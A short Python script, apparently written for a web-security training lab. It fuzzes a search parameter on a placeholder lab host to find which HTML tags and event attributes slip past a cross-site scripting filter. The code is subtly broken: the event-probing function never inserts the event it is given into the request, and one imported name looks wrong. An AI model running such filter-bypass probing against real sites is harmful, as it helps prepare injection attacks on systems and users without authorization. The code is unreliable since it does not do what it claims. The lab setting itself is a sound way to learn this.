from requests import get
from ratelimit import limits, RetryLimitException, sleep_and_retry
from pathlib import Path

url = 'https://INSTANCE-ID.web-security-academy.net/?search=<'

ONE_MINUTE = 60
MAX_CALLS_PER_MINUTE = 120

@sleep_and_retry
@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
def make_tag_call(url, tag):
    return get(f"{url}{tag}>")

def tag_enum(url, tag_file_path):
    with Path(tag_file_path).open('r') as file:
        for tag in file.readlines():
            response = make_tag_call(url, tag.strip())
            if response.status_code != 400:
                return tag

    return "NOT FOUND"


@sleep_and_retry
@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
def make_event_call(url, tag, event):
    return get(f"{url}{tag}%20=1>")

def event_enum(url, tag, event_file_path):
    with Path(event_file_path).open('r') as file:
        for event in file.readlines():
            response = make_event_call(url, tag.strip(), event.strip())
            if response.status_code != 400:
                return event
                
    return "NOT FOUND"

def main():
    tag = tag_enum(url, 'tags.txt')
    print(tag)

if __name__ == "__main__":
    main()